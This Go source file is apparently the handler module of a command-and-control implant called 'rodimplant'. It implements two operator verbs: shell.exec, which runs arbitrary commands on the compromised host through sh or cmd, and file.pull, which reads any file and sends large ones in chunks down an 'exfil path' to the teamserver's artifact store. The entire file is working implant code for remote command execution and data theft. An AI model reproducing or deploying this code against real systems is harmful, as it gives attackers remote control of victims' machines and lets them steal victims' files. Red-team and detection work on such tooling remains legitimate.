// Package handlers is the compiled verb set: the implant-side half of the
// two-halves capability contract (extending/modules.md). The verb string
// and the opaque argument string are the whole coupling -- nothing in
// here knows the teamserver exists.
package handlers

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"unicode/utf8"

	"rodimplant/internal/session"
	"rodimplant/internal/wire"
)

// The inline ceiling: results at or under it report their bytes verbatim
// (the operator console renders text); anything larger takes the chunked
// exfil path into the artifact store.
const maxInlineBytes = 1 << 20

// Compiled returns the handler table: the verbs this binary carries.
func Compiled() map[string]session.Handler {
	return map[string]session.Handler{
		"shell.exec": ShellExec,
		"file.pull":  FilePull,
	}
}

// ShellExec runs a one-shot command through the platform shell and
// reports its combined output.
func ShellExec(arguments string) (wire.TaskOutcome, string, *session.Artifact) {
	command := strings.TrimSpace(arguments)
	if command == "" {
		return wire.TaskOutcome_TASK_OUTCOME_FAILED, "shell.exec expects '<command>'", nil
	}
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	output, err := cmd.CombinedOutput()
	text := string(output)
	if err != nil {
		return wire.TaskOutcome_TASK_OUTCOME_FAILED, fmt.Sprintf("%s: %s", err, text), nil
	}
	return wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED, text, nil
}

// FilePull reads one file: small files report inline, larger ones stream
// to the artifact store as an offset-bearing exfil run.
func FilePull(arguments string) (wire.TaskOutcome, string, *session.Artifact) {
	path := strings.TrimSpace(arguments)
	if path == "" {
		return wire.TaskOutcome_TASK_OUTCOME_FAILED, "file.pull expects '<path>'", nil
	}
	info, err := os.Stat(path)
	if err != nil {
		return wire.TaskOutcome_TASK_OUTCOME_FAILED, fmt.Sprintf("stat %s: file not found", path), nil
	}
	if info.IsDir() {
		return wire.TaskOutcome_TASK_OUTCOME_FAILED, fmt.Sprintf("file.pull refuses to dump a directory: %s", path), nil
	}
	data, err := os.ReadFile(path)
	if err != nil {
		return wire.TaskOutcome_TASK_OUTCOME_FAILED, fmt.Sprintf("read %s: %v", path, err), nil
	}
	if len(data) <= maxInlineBytes {
		if !utf8.Valid(data) {
			// Binary inline output renders as replacement characters,
			// matching the reference implant's lossy UTF-8 inline shape.
			return wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED, strings.ToValidUTF8(string(data), "\uFFFD"), nil
		}
		return wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED, string(data), nil
	}
	name := filepath.Base(path)
	chunks := (len(data) + session.ExfilChunkBytes - 1) / session.ExfilChunkBytes
	output := fmt.Sprintf("%s: %d bytes, %d chunks streamed to artifact store", path, len(data), chunks)
	return wire.TaskOutcome_TASK_OUTCOME_SUCCEEDED, output, &session.Artifact{
		Name:        name,
		ContentType: "application/octet-stream",
		Data:        data,
	}
}
